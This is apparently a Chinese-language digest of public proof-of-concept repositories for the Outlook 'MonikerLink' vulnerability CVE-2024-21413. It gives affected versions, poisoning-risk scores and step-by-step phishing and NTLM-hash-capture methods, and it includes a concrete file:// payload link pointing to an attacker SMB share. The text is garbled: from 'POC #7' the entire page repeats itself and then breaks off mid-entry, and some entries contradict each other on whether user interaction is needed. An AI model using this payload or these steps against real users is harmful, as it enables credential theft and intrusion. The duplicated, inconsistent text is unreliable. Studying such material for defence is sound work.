# CVE-2024-21413

> 📦 该CVE有 **23** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-21413-ArtemCyberLab_Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413.md](../2024/CVE-2024-21413-ArtemCyberLab_Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和系统被完全控制

**影响版本:** Office 2016版本小于 16.0.5435.1001，Office 2019、Microsoft 365 Apps for Enterprise、Office LTSC 2021 版本小于 https://aka.ms/OfficeSecurityReleases 指示的版本

**利用条件:** 受害者需要点击攻击者发送的包含恶意链接的邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 'MonikerLink' 漏洞。攻击者可以通过发送包含特制 `file://` URL 的电子邮件来利用此漏洞，当用户点击该链接时，Outlook 会尝试访问该 URL 指向的文件，如果该 URL 指向攻击者控制的服务器，攻击者可以捕获 NTLM 哈希或触发其他恶意行为，甚至实现远程代码执行。

**漏洞利用有效性：**
根据提供的漏洞利用代码，该 POC 利用了 `file://` 协议处理不当的问题。POC 包含两个部分：使用 Responder 捕获 NTLM 哈希和使用 Python 脚本发送包含恶意 `file://` 链接的电子邮件。该方法利用了 Outlook 对 `file://` 协议的处理缺陷，在无需用户交互的情况下触发漏洞，因此判断POC具有有效性。

**投毒风险：**
该漏洞利用代码主要包含一个 Python 脚本，用于发送包含恶意链接的电子邮件。虽然脚本本身的功能是发送电子邮件，但其中包含的恶意链接可能导致受害者系统遭受攻击。Responder 工具用于捕获网络中的 NTLM 哈希，本身属于安全工具，但也被攻击者用于非法目的。该漏洞利用代码的主要风险在于利用邮件进行社工欺骗，诱导用户点击恶意链接。攻击者可以替换链接指向的恶意文件，执行任意命令，或者植入后门。该 POC 存在一定的投毒风险，评估为10%。

**利用方式：**
1.  攻击者使用 Responder 等工具监听网络，准备捕获 NTLM 哈希。
2.  攻击者构造包含恶意 `file://` 链接的电子邮件。链接指向攻击者控制的服务器或共享目录。
3.  攻击者将电子邮件发送给受害者。
4.  受害者打开电子邮件并点击恶意链接。
5.  Outlook 尝试访问该链接，导致 NTLM 认证信息泄露或触发其他恶意行为。
6. 攻击者可以利用捕获的 NTLM 哈希进行进一步的攻击，例如破解哈希或利用 Pass-the-Hash 技术。

**项目地址:** [ArtemCyberLab/Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413](https://github.com/ArtemCyberLab/Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #2

**来源**: [CVE-2024-21413-CMNatic_CVE-2024-21413.md](../2024/CVE-2024-21413-CMNatic_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在受害者机器上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016 (版本 < 16.0.5435.1001)，Microsoft Office 2019，Microsoft 365 Apps for Enterprise，Microsoft Office LTSC 2021，具体版本范围参考漏洞库信息

**利用条件:** 无需用户交互即可触发

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 "MonikerLink" 漏洞。漏洞位于Outlook处理moniker链接的方式上，未经身份验证的远程攻击者可以通过发送特制的电子邮件来利用此漏洞，从而在受害者的系统上执行任意代码，而无需用户交互。根据搜索引擎结果，此漏洞利用的复杂度较低，危害性极高。漏洞库信息显示 CVSS 评分为 9.8，属于危急漏洞。CISA 已将其添加到已知被利用漏洞目录（KEV）。

提供的漏洞利用代码只是一个Apache License 2.0的LICENSE文件,本身不包含任何漏洞利用代码，但根据搜索引擎结果中的 "github.com/ThemeHackers/CVE-2024-21413" 链接，推测存在公开可用的漏洞利用代码。 由于提供的代码仅仅是一个LICENSE文件，所以可以判定投毒风险为0%。

**利用方式：** 攻击者构造包含恶意 moniker 链接的电子邮件，当 Outlook 客户端解析该邮件时，会触发漏洞并执行攻击者预设的恶意代码，最终导致远程代码执行。

**项目地址:** [CMNatic/CVE-2024-21413](https://github.com/CMNatic/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #3

**来源**: [CVE-2024-21413-Cyber-Trambon_CVE-2024-21413-exploit.md](../2024/CVE-2024-21413-Cyber-Trambon_CVE-2024-21413-exploit.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，可能导致信息泄露、NTLM凭据窃取和远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office LTSC 2021、Microsoft 365 Apps for Enterprise、Microsoft Outlook 2016 和 Microsoft Office 2019。具体受影响版本请参考漏洞库信息。

**利用条件:** 攻击者需要能够通过电子邮件向目标用户发送特制邮件。

**POC 可用性:** 是

**投毒风险:** 30%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中存在的一个远程代码执行漏洞，也称为 "MonikerLink" 漏洞。攻击者可以通过在电子邮件中嵌入特制的 `file://` 链接，绕过 Protected View 并执行恶意代码。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞被标记为严重，且存在在野利用。提供的 POC 代码利用了 `file://` 协议处理中的缺陷，通过构造恶意链接（例如 `file:///\\10.10.111.111\test\test.rtf!exploit`）来触发漏洞。POC 代码中给出了使用示例，表明该漏洞利用方式是有效的。

**投毒风险：**
POC 代码本身看起来是直接的，旨在利用该漏洞进行远程代码执行或者泄露NTLM凭据。但是，**存在以下几点需要注意**：
1.  **短链接风险**: POC 使用短链接 `https://shorturl.at/7itzw` 下载代码，这本身就是一个潜在的风险点。虽然当前链接可能指向合法的代码仓库，但攻击者可以随时更改短链接的目标地址，从而传播恶意软件。
2.  **Payload 可定制性**：该 POC 允许用户自定义 payload，这为潜在的恶意利用敞开了大门。用户可以将 payload 设置为下载和执行恶意代码，从而实现远程控制等目的。
3.  **隐蔽的后门植入**: 由于代码可以被修改,有可能被植入后门。

考虑到短链接带来的不确定性，Payload的可定制性，以及后门植入的可能性，存在30%的投毒风险。

**利用方式：**
1.  **构造恶意邮件：** 攻击者创建一个包含特制 `file://` 链接的电子邮件。
2.  **发送邮件：** 将该邮件发送给目标用户。
3.  **触发漏洞：** 当用户打开邮件时，Outlook 尝试解析 `file://` 链接。如果链接构造不当（例如包含 `!exploit`），则可能触发漏洞，导致执行恶意代码或泄露 NTLM 凭据。
4.  **远程代码执行或凭据窃取：** 如果成功利用该漏洞，攻击者可以执行任意代码或窃取用户的 NTLM 凭据，从而进一步控制受害者的系统。

综上所述，CVE-2024-21413 是一个严重的漏洞，利用方式相对简单，且存在有效的 POC 代码。企业应尽快应用 Microsoft 提供的补丁，以防止攻击者利用该漏洞进行攻击。

**项目地址:** [Cyber-Trambon/CVE-2024-21413-exploit](https://github.com/Cyber-Trambon/CVE-2024-21413-exploit)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #4

**来源**: [CVE-2024-21413-D1se0_CVE-2024-21413-Vulnerabilidad-Outlook-LAB.md](../2024/CVE-2024-21413-D1se0_CVE-2024-21413-Vulnerabilidad-Outlook-LAB.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致信息泄露、远程代码执行和权限提升

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本 < 16.0.5435.1001)、Microsoft Office 2019、Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021（所有受支持版本，直至2024年2月更新）。

**利用条件:** 需要受害者使用 Microsoft Outlook 打开包含特制 file:// 链接的邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一种 Microsoft Outlook 远程代码执行漏洞，也称为 “MonikerLink” 漏洞。攻击者可以利用此漏洞通过发送包含恶意 `file://` 链接的电子邮件来远程执行代码。当用户点击该链接时，Outlook 会尝试连接到攻击者控制的 SMB 共享，这可能导致 NTLM 凭据泄露或未经授权访问本地文件。

**有效性：**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用的有效性较高。CISA已将此漏洞添加到已知被利用的漏洞目录(KEV)中，表明该漏洞在野外已被积极利用。PoC代码提供了一种利用 `file://` 协议将受害者重定向到攻击者控制的 SMB 共享的方案，进一步验证了该漏洞的有效性。

**投毒风险：**
PoC代码主要包含利用脚本(exploitSendEmailOutlook.py, captureHashResponder.py)和辅助配置文件。`exploitSendEmailOutlook.py` 脚本用于发送包含恶意链接的电子邮件，`captureHashResponder.py` 用于启动 Responder 工具以捕获 NTLM 哈希。startServicesWindows.py用于快速启动漏洞验证环境.投毒风险主要存在于以下几个方面：

1.  **隐蔽的反向 Shell：** 攻击者可能在 `exploitSendEmailOutlook.py` 脚本中添加反向 Shell 代码，在受害者点击恶意链接时，在后台静默执行，从而控制受害者系统。
2.  **恶意 Responder 配置：** 攻击者可能修改 `captureHashResponder.py` 脚本，使其在捕获 NTLM 哈希的同时，执行其他恶意操作，例如下载并执行恶意文件。
3.  **供应链投毒：** 该 PoC 依赖于多个 Python 库（如 `pyautogui`、`Pillow`、`opencv-python` 和 `rich`）。攻击者可能通过篡改这些依赖库，植入恶意代码，从而影响所有使用该 PoC 的用户。

综合考虑，虽然 PoC 代码主要功能是演示漏洞利用，但存在潜在的投毒风险。攻击者可能利用代码中的可扩展性，添加恶意功能，或者通过篡改依赖库进行供应链投毒。因此，在使用该 PoC 时，务必进行代码审计，并从可信的源获取依赖库。

**利用方式：**
利用方式如下：

1.  **发送恶意邮件：** 攻击者构造一封包含恶意 `file://` 链接的电子邮件，并将其发送给受害者。
2.  **诱导点击链接：** 攻击者通过各种手段诱使受害者点击邮件中的恶意链接。
3.  **NTLM 凭据捕获/文件访问：** 受害者点击链接后，Outlook 会尝试连接到攻击者控制的 SMB 共享。Responder 工具会捕获受害者的 NTLMv2 哈希。或者，攻击者可以直接访问受害者本地文件（如果链接指向本地文件）。
4.  **代码执行 (可选)：** 攻击者可以进一步利用捕获的 NTLM 哈希进行密码破解，或者利用文件访问权限在受害者系统上执行恶意代码。

总而言之，CVE-2024-21413 是一个高危漏洞，利用方式简单，容易被攻击者利用。在使用该漏洞验证 PoC 时，必须在隔离环境中进行，并仔细审查代码，以防止被投毒。

**项目地址:** [D1se0/CVE-2024-21413-Vulnerabilidad-Outlook-LAB](https://github.com/D1se0/CVE-2024-21413-Vulnerabilidad-Outlook-LAB)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #5

**来源**: [CVE-2024-21413-DerZiad_CVE-2024-21413.md](../2024/CVE-2024-21413-DerZiad_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016、2019、LTSC 2021和Microsoft 365 Apps for Enterprise的特定版本

**利用条件:** 攻击者需要诱使用户打开恶意构造的电子邮件或者访问恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，无需用户交互即可触发。 根据搜索结果，该漏洞也被称为"MonikerLink" bug。漏洞利用方式通常涉及构造特殊的电子邮件，诱使用户打开或预览，从而在用户系统上执行任意代码。提供的漏洞利用代码仅仅是Apache License 2.0，不包含任何可执行代码，因此无法评估漏洞利用的有效性。但是，根据CVE信息和搜索结果，该漏洞的利用已经存在，并被CISA列入已知被利用漏洞目录。由于提供的代码只是许可证，因此不存在投毒风险。

**项目地址:** [DerZiad/CVE-2024-21413](https://github.com/DerZiad/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #6

**来源**: [CVE-2024-21413-MQKGitHub_Moniker-Link-CVE-2024-21413.md](../2024/CVE-2024-21413-MQKGitHub_Moniker-Link-CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE) / NTLM Hash Leak

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行、NTLM凭据泄露、横向移动和权限提升

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021

**利用条件:** 用户需要点击恶意链接，攻击者可以通过构造恶意链接在电子邮件或其他Office文档中触发漏洞。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个关键安全漏洞，被称为“MonikerLink”。该漏洞允许攻击者绕过 Outlook 的内置保护机制，例如受保护视图，并利用 Moniker Link 泄露 NTLM 凭据，甚至可能执行远程代码。根据漏洞信息和搜索结果，该漏洞涉及对特定超链接处理不当的问题。攻击者可以通过在文件中构造恶意链接来利用此漏洞。

**利用方式：**

1.  **构造恶意链接：** 攻击者创建一个包含恶意 Moniker Link 的电子邮件或其他 Office 文档。该链接旨在利用 `MkParseDisplayName()` API 的行为。
2.  **绕过保护：** 通过在 `file://` URL 中使用 `!exploit` 等技巧绕过 Outlook 的 Protected View。
3.  **触发 SMB 身份验证：** 恶意链接指向攻击者控制的 SMB 服务器，从而触发受害者的 Outlook 尝试进行 SMB 身份验证。
4.  **捕获 NTLM 哈希：** 攻击者使用 Responder 等工具监听 SMB 身份验证请求，并捕获受害者的 NTLMv2 哈希。
5.  **潜在的 RCE：** 虽然目前没有公开可用的 RCE PoC，但该漏洞具有远程代码执行的潜力。

**有效性评估：**
提供的漏洞利用代码是一个关于如何利用 CVE-2024-21413 漏洞的说明文档和示例。它展示了使用 Python (smtplib) 发送包含恶意 Moniker Link 的电子邮件，并使用 Responder 捕获 NTLM 哈希的过程。根据 TryHackMe 挑战的完成状态，提供的 PoC 是有效的，可以成功利用该漏洞泄露 NTLM 哈希。

**投毒风险评估：**
该仓库主要是一个漏洞利用教程和概念验证，并没有明显的恶意代码。但仍然存在一定的投毒风险，主要体现在以下几个方面：

*   **潜在的细微修改：** 攻击者可能会在示例脚本中引入细微的修改，例如更改 SMB 服务器的 IP 地址或添加额外的恶意功能。尽管可能性不高，但仍然需要保持警惕。
*   **依赖的工具：** 该漏洞利用依赖于 Responder 等工具。如果攻击者修改了这些工具，可能会导致意外的行为或安全问题。

因此，综合评估投毒风险较低，但不能完全排除，可能性大约为10%。


**项目地址:** [MQKGitHub/Moniker-Link-CVE-2024-21413](https://github.com/MQKGitHub/Moniker-Link-CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #7

**来源**: [CVE-2024-21413-MSeymenD_CVE-2024-21413.md](../2024/CVE-2024-21413-MSeymenD_CVE-2024-21413.md)

# CVE-2024-21413

> 📦 该CVE有 **23** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-21413-ArtemCyberLab_Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413.md](../2024/CVE-2024-21413-ArtemCyberLab_Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和系统被完全控制

**影响版本:** Office 2016版本小于 16.0.5435.1001，Office 2019、Microsoft 365 Apps for Enterprise、Office LTSC 2021 版本小于 https://aka.ms/OfficeSecurityReleases 指示的版本

**利用条件:** 受害者需要点击攻击者发送的包含恶意链接的邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 'MonikerLink' 漏洞。攻击者可以通过发送包含特制 `file://` URL 的电子邮件来利用此漏洞，当用户点击该链接时，Outlook 会尝试访问该 URL 指向的文件，如果该 URL 指向攻击者控制的服务器，攻击者可以捕获 NTLM 哈希或触发其他恶意行为，甚至实现远程代码执行。

**漏洞利用有效性：**
根据提供的漏洞利用代码，该 POC 利用了 `file://` 协议处理不当的问题。POC 包含两个部分：使用 Responder 捕获 NTLM 哈希和使用 Python 脚本发送包含恶意 `file://` 链接的电子邮件。该方法利用了 Outlook 对 `file://` 协议的处理缺陷，在无需用户交互的情况下触发漏洞，因此判断POC具有有效性。

**投毒风险：**
该漏洞利用代码主要包含一个 Python 脚本，用于发送包含恶意链接的电子邮件。虽然脚本本身的功能是发送电子邮件，但其中包含的恶意链接可能导致受害者系统遭受攻击。Responder 工具用于捕获网络中的 NTLM 哈希，本身属于安全工具，但也被攻击者用于非法目的。该漏洞利用代码的主要风险在于利用邮件进行社工欺骗，诱导用户点击恶意链接。攻击者可以替换链接指向的恶意文件，执行任意命令，或者植入后门。该 POC 存在一定的投毒风险，评估为10%。

**利用方式：**
1.  攻击者使用 Responder 等工具监听网络，准备捕获 NTLM 哈希。
2.  攻击者构造包含恶意 `file://` 链接的电子邮件。链接指向攻击者控制的服务器或共享目录。
3.  攻击者将电子邮件发送给受害者。
4.  受害者打开电子邮件并点击恶意链接。
5.  Outlook 尝试访问该链接，导致 NTLM 认证信息泄露或触发其他恶意行为。
6. 攻击者可以利用捕获的 NTLM 哈希进行进一步的攻击，例如破解哈希或利用 Pass-the-Hash 技术。

**项目地址:** [ArtemCyberLab/Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413](https://github.com/ArtemCyberLab/Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #2

**来源**: [CVE-2024-21413-CMNatic_CVE-2024-21413.md](../2024/CVE-2024-21413-CMNatic_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在受害者机器上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016 (版本 < 16.0.5435.1001)，Microsoft Office 2019，Microsoft 365 Apps for Enterprise，Microsoft Office LTSC 2021，具体版本范围参考漏洞库信息

**利用条件:** 无需用户交互即可触发

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 "MonikerLink" 漏洞。漏洞位于Outlook处理moniker链接的方式上，未经身份验证的远程攻击者可以通过发送特制的电子邮件来利用此漏洞，从而在受害者的系统上执行任意代码，而无需用户交互。根据搜索引擎结果，此漏洞利用的复杂度较低，危害性极高。漏洞库信息显示 CVSS 评分为 9.8，属于危急漏洞。CISA 已将其添加到已知被利用漏洞目录（KEV）。

提供的漏洞利用代码只是一个Apache License 2.0的LICENSE文件,本身不包含任何漏洞利用代码，但根据搜索引擎结果中的 "github.com/ThemeHackers/CVE-2024-21413" 链接，推测存在公开可用的漏洞利用代码。 由于提供的代码仅仅是一个LICENSE文件，所以可以判定投毒风险为0%。

**利用方式：** 攻击者构造包含恶意 moniker 链接的电子邮件，当 Outlook 客户端解析该邮件时，会触发漏洞并执行攻击者预设的恶意代码，最终导致远程代码执行。

**项目地址:** [CMNatic/CVE-2024-21413](https://github.com/CMNatic/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #3

**来源**: [CVE-2024-21413-Cyber-Trambon_CVE-2024-21413-exploit.md](../2024/CVE-2024-21413-Cyber-Trambon_CVE-2024-21413-exploit.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，可能导致信息泄露、NTLM凭据窃取和远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office LTSC 2021、Microsoft 365 Apps for Enterprise、Microsoft Outlook 2016 和 Microsoft Office 2019。具体受影响版本请参考漏洞库信息。

**利用条件:** 攻击者需要能够通过电子邮件向目标用户发送特制邮件。

**POC 可用性:** 是

**投毒风险:** 30%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中存在的一个远程代码执行漏洞，也称为 "MonikerLink" 漏洞。攻击者可以通过在电子邮件中嵌入特制的 `file://` 链接，绕过 Protected View 并执行恶意代码。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞被标记为严重，且存在在野利用。提供的 POC 代码利用了 `file://` 协议处理中的缺陷，通过构造恶意链接（例如 `file:///\\10.10.111.111\test\test.rtf!exploit`）来触发漏洞。POC 代码中给出了使用示例，表明该漏洞利用方式是有效的。

**投毒风险：**
POC 代码本身看起来是直接的，旨在利用该漏洞进行远程代码执行或者泄露NTLM凭据。但是，**存在以下几点需要注意**：
1.  **短链接风险**: POC 使用短链接 `https://shorturl.at/7itzw` 下载代码，这本身就是一个潜在的风险点。虽然当前链接可能指向合法的代码仓库，但攻击者可以随时更改短链接的目标地址，从而传播恶意软件。
2.  **Payload 可定制性**：该 POC 允许用户自定义 payload，这为潜在的恶意利用敞开了大门。用户可以将 payload 设置为下载和执行恶意代码，从而实现远程控制等目的。
3.  **隐蔽的后门植入**: 由于代码可以被修改,有可能被植入后门。

考虑到短链接带来的不确定性，Payload的可定制性，以及后门植入的可能性，存在30%的投毒风险。

**利用方式：**
1.  **构造恶意邮件：** 攻击者创建一个包含特制 `file://` 链接的电子邮件。
2.  **发送邮件：** 将该邮件发送给目标用户。
3.  **触发漏洞：** 当用户打开邮件时，Outlook 尝试解析 `file://` 链接。如果链接构造不当（例如包含 `!exploit`），则可能触发漏洞，导致执行恶意代码或泄露 NTLM 凭据。
4.  **远程代码执行或凭据窃取：** 如果成功利用该漏洞，攻击者可以执行任意代码或窃取用户的 NTLM 凭据，从而进一步控制受害者的系统。

综上所述，CVE-2024-21413 是一个严重的漏洞，利用方式相对简单，且存在有效的 POC 代码。企业应尽快应用 Microsoft 提供的补丁，以防止攻击者利用该漏洞进行攻击。

**项目地址:** [Cyber-Trambon/CVE-2024-21413-exploit](https://github.com/Cyber-Trambon/CVE-2024-21413-exploit)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #4

**来源**: [CVE-2024-21413-D1se0_CVE-2024-21413-Vulnerabilidad-Outlook-LAB.md](../2024/CVE-2024-21413-D1se0_CVE-2024-21413-Vulnerabilidad-Outlook-LAB.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致信息泄露、远程代码执行和权限提升

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本 < 16.0.5435.1001)、Microsoft Office 2019、Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021（所有受支持版本，直至2024年2月更新）。

**利用条件:** 需要受害者使用 Microsoft Outlook 打开包含特制 file:// 链接的邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一种 Microsoft Outlook 远程代码执行漏洞，也称为 “MonikerLink” 漏洞。攻击者可以利用此漏洞通过发送包含恶意 `file://` 链接的电子邮件来远程执行代码。当用户点击该链接时，Outlook 会尝试连接到攻击者控制的 SMB 共享，这可能导致 NTLM 凭据泄露或未经授权访问本地文件。

**有效性：**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用的有效性较高。CISA已将此漏洞添加到已知被利用的漏洞目录(KEV)中，表明该漏洞在野外已被积极利用。PoC代码提供了一种利用 `file://` 协议将受害者重定向到攻击者控制的 SMB 共享的方案，进一步验证了该漏洞的有效性。

**投毒风险：**
PoC代码主要包含利用脚本(exploitSendEmailOutlook.py, captureHashResponder.py)和辅助配置文件。`exploitSendEmailOutlook.py` 脚本用于发送包含恶意链接的电子邮件，`captureHashResponder.py` 用于启动 Responder 工具以捕获 NTLM 哈希。startServicesWindows.py用于快速启动漏洞验证环境.投毒风险主要存在于以下几个方面：

1.  **隐蔽的反向 Shell：** 攻击者可能在 `exploitSendEmailOutlook.py` 脚本中添加反向 Shell 代码，在受害者点击恶意链接时，在后台静默执行，从而控制受害者系统。
2.  **恶意 Responder 配置：** 攻击者可能修改 `captureHashResponder.py` 脚本，使其在捕获 NTLM 哈希的同时，执行其他恶意操作，例如下载并执行恶意文件。
3.  **供应链投毒：** 该 PoC 依赖于多个 Python 库（如 `pyautogui`、`Pillow`、`opencv-python` 和 `rich`）。攻击者可能通过篡改这些依赖库，植入恶意代码，从而影响所有使用该 PoC 的用户。

综合考虑，虽然 PoC 代码主要功能是演示漏洞利用，但存在潜在的投毒风险。攻击者可能利用代码中的可扩展性，添加恶意功能，或者通过篡改依赖库进行供应链投毒。因此，在使用该 PoC 时，务必进行代码审计，并从可信的源获取依赖库。

**利用方式：**
利用方式如下：

1.  **发送恶意邮件：** 攻击者构造一封包含恶意 `file://` 链接的电子邮件，并将其发送给受害者。
2.  **诱导点击链接：** 攻击者通过各种手段诱使受害者点击邮件中的恶意链接。
3.  **NTLM 凭据捕获/文件访问：** 受害者点击链接后，Outlook 会尝试连接到攻击者控制的 SMB 共享。Responder 工具会捕获受害者的 NTLMv2 哈希。或者，攻击者可以直接访问受害者本地文件（如果链接指向本地文件）。
4.  **代码执行 (可选)：** 攻击者可以进一步利用捕获的 NTLM 哈希进行密码破解，或者利用文件访问权限在受害者系统上执行恶意代码。

总而言之，CVE-2024-21413 是一个高危漏洞，利用方式简单，容易被攻击者利用。在使用该漏洞验证 PoC 时，必须在隔离环境中进行，并仔细审查代码，以防止被投毒。

**项目地址:** [D1se0/CVE-2024-21413-Vulnerabilidad-Outlook-LAB](https://github.com/D1se0/CVE-2024-21413-Vulnerabilidad-Outlook-LAB)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #5

**来源**: [CVE-2024-21413-DerZiad_CVE-2024-21413.md](../2024/CVE-2024-21413-DerZiad_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016、2019、LTSC 2021和Microsoft 365 Apps for Enterprise的特定版本

**利用条件:** 攻击者需要诱使用户打开恶意构造的电子邮件或者访问恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，无需用户交互即可触发。 根据搜索结果，该漏洞也被称为"MonikerLink" bug。漏洞利用方式通常涉及构造特殊的电子邮件，诱使用户打开或预览，从而在用户系统上执行任意代码。提供的漏洞利用代码仅仅是Apache License 2.0，不包含任何可执行代码，因此无法评估漏洞利用的有效性。但是，根据CVE信息和搜索结果，该漏洞的利用已经存在，并被CISA列入已知被利用漏洞目录。由于提供的代码只是许可证，因此不存在投毒风险。

**项目地址:** [DerZiad/CVE-2024-21413](https://github.com/DerZiad/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #6

**来源**: [CVE-2024-21413-MQKGitHub_Moniker-Link-CVE-2024-21413.md](../2024/CVE-2024-21413-MQKGitHub_Moniker-Link-CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE) / NTLM Hash Leak

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行、NTLM凭据泄露、横向移动和权限提升

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021

**利用条件:** 用户需要点击恶意链接，攻击者可以通过构造恶意链接在电子邮件或其他Office文档中触发漏洞。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个关键安全漏洞，被称为“MonikerLink”。该漏洞允许攻击者绕过 Outlook 的内置保护机制，例如受保护视图，并利用 Moniker Link 泄露 NTLM 凭据，甚至可能执行远程代码。根据漏洞信息和搜索结果，该漏洞涉及对特定超链接处理不当的问题。攻击者可以通过在文件中构造恶意链接来利用此漏洞。

**利用方式：**

1.  **构造恶意链接：** 攻击者创建一个包含恶意 Moniker Link 的电子邮件或其他 Office 文档。该链接旨在利用 `MkParseDisplayName()` API 的行为。
2.  **绕过保护：** 通过在 `file://` URL 中使用 `!exploit` 等技巧绕过 Outlook 的 Protected View。
